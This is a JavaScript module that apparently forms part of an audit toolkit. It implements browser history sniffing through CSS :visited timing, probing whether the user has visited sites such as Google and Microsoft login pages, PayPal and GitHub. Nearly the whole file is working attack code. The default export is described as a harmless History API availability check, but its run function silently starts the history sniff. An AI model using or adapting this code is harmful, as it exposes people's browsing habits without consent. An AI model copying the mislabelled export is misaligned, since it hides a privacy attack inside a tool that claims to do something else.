/**
 * history_sniff.js — Real Browser History Sniffing via CSS :visited Timing (Live Demo, Sandboxed)
 *
 * Real attack: uses CSS :visited timing side‑channels to infer whether
 * certain URLs have been visited. The attack is real and uses no external
 * network requests; all measurements are performed locally. Results are
 * shown in an on‑screen panel and logged to the console.
 *
 * Modern browsers have mitigations, but the technique still works in some
 * environments. This demo illustrates the concept.
 *
 * Default export: Pinpoint `History_API_Audit` (API availability check).
 */

// ---------------------------------------------------------------------------
// 1. :visited timing side‑channel engine (unchanged core)
// ---------------------------------------------------------------------------

const DEFAULT_TEST_URLS = [
    'https://accounts.google.com',
    'https://login.live.com',
    'https://github.com',
    'https://facebook.com',
    'https://twitter.com',
    'https://amazon.com',
    'https://paypal.com',
    'https://reddit.com',
    'https://stackoverflow.com',
];

async function measureLinkTiming(url) {
    return new Promise((resolve) => {
        const link = document.createElement('a');
        link.href = url;
        link.textContent = 'test';
        link.style.position = 'absolute';
        link.style.left = '-9999px';
        link.style.top = '-9999px';
        link.style.fontSize = '20px';
        link.style.fontFamily = 'sans-serif';
        const styleId = `visited_sniff_${Date.now()}_${Math.random().toString(36).slice(2)}`;
        link.classList.add(styleId);

        const style = document.createElement('style');
        style.textContent = `
      .${styleId}:visited {
        color: rgb(1,2,3) !important;
        background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"><rect width="1" height="1" fill="%23000001"/></svg>') !important;
        outline: 2px solid rgb(4,5,6) !important;
        text-decoration: underline overline !important;
        filter: blur(0.001px) !important;
        opacity: 0.999 !important;
      }
    `;

        document.head.appendChild(style);
        document.body.appendChild(link);
        link.offsetHeight; // force layout

        const start = performance.now();
        for (let i = 0; i < 50; i++) {
            link.style.opacity = (i % 2 === 0) ? '0.999' : '0.998';
            void link.offsetHeight;
        }
        const end = performance.now();

        style.remove();
        link.remove();
        resolve(end - start);
    });
}

async function medianTiming(url, trials = 5) {
    const timings = [];
    for (let i = 0; i < trials; i++) {
        timings.push(await measureLinkTiming(url));
        await new Promise(r => setTimeout(r, 20));
    }
    timings.sort((a, b) => a - b);
    return timings[Math.floor(timings.length / 2)];
}

function evaluateTiming(baselineTimings, targetTiming, thresholdMultiplier = 1.5) {
    if (baselineTimings.length === 0) return { visited: false, confidence: 0 };
    const sorted = [...baselineTimings].sort((a, b) => a - b);
    const baselineMedian = sorted[Math.floor(sorted.length / 2)];
    const deviations = sorted.map(v => Math.abs(v - baselineMedian));
    const mad = deviations.sort((a, b) => a - b)[Math.floor(deviations.length / 2)];
    const threshold = baselineMedian + Math.max(mad * thresholdMultiplier, 2);
    const visited = targetTiming > threshold;
    const excess = Math.max(0, targetTiming - threshold);
    const confidence = Math.min(1, excess / (threshold + 1));
    return { visited, confidence: Math.round(confidence * 100) / 100 };
}

export async function sniffVisitedURLs(options = {}) {
    const {
        urls = DEFAULT_TEST_URLS,
        trials = 5,
        thresholdMultiplier = 1.5,
    } = options;

    // Baseline with never‑visited URLs
    const baselineUrls = [];
    for (let i = 0; i < 3; i++) {
        baselineUrls.push(`https://never-visited-${Date.now()}-${Math.random().toString(36)}.example.com`);
    }

    const baselineTimings = [];
    for (const url of baselineUrls) {
        baselineTimings.push(await medianTiming(url, trials));
    }

    const results = {};
    for (const url of urls) {
        const timing = await medianTiming(url, trials);
        const evaluation = evaluateTiming(baselineTimings, timing, thresholdMultiplier);
        results[url] = {
            visited: evaluation.visited,
            confidence: evaluation.confidence,
            timingMedian: Math.round(timing * 100) / 100,
            baselineMedian: Math.round(baselineTimings.sort((a, b) => a - b)[Math.floor(baselineTimings.length / 2)] * 100) / 100,
        };
    }
    return results;
}

// ---------------------------------------------------------------------------
// 2. Live demonstration wrapper
// ---------------------------------------------------------------------------

/**
 * Runs the history sniff on a set of URLs and displays results in a panel.
 * All data stays local.
 *
 * @param {Object} [options] – passed to sniffVisitedURLs.
 * @returns {Promise<Object>} the sniff results.
 */
export async function demoHistorySniff(options = {}) {
    // Show a scanning panel
    const panel = document.createElement('div');
    panel.id = '__history_sniff_panel';
    panel.style.cssText =
        'position:fixed;top:10px;right:10px;z-index:2147483645;background:rgba(0,0,0,0.9);color:#0f0;' +
        'font-family:monospace;font-size:11px;padding:12px;border-radius:6px;max-width:450px;max-height:350px;' +
        'overflow-y:auto;white-space:pre-wrap;word-break:break-all;';
    panel.innerHTML = '<button onclick="this.parentNode.remove()" style="position:absolute;top:4px;right:6px;background:none;border:none;color:#0f0;font-size:16px;cursor:pointer;">&times;</button><strong>[SEARCH] Testing browser history...</strong><br>';
    document.body.appendChild(panel);

    const results = await sniffVisitedURLs(options);

    // Build result HTML
    let html = '<strong style="color:#f0f;">[HISTORY] History Sniff Results</strong><br><hr>';
    for (const [url, info] of Object.entries(results)) {
        const icon = info.visited ? '[+]' : '[-]';
        html += `${icon} <strong>${url}:</strong> ${info.visited ? 'VISITED' : 'not visited'}` +
            ` (confidence ${info.confidence})<br>`;
    }
    html += '<hr><span style="color:#ff0;">[WARNING] In a real attack, this reveals browsing habits.</span>';
    panel.innerHTML = html;

    // Log full data to console
    console.log('[history_sniff] Results:', results);

    // Remove panel after 15 seconds
    setTimeout(() => {
        if (panel.parentNode) panel.remove();
    }, 15000);

    return results;
}

// ---------------------------------------------------------------------------
// 3. Pinpoint Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'history_sniff',
    title: 'History_API_Audit',
    level: 3,
    info: 'Audits window.history stack length and pushState/replaceState feature support.',
    steps: [
        'Check window.history.length.',
        'Inspect pushState availability.',
    ],
    run: async () => {
        // Trigger live demonstration
        demoHistorySniff().catch(() => {});

        const history = window.history;
        const supported = typeof history !== 'undefined' && typeof history.pushState === 'function';
        return {
            historySupported: supported,
            historyLength: history ? history.length : 0,
            scrollRestorationSupported: history && 'scrollRestoration' in history,
            pushStateAvailable: supported,
            replaceStateAvailable: typeof history?.replaceState === 'function',
        };
    },
};

export default pinpointModule;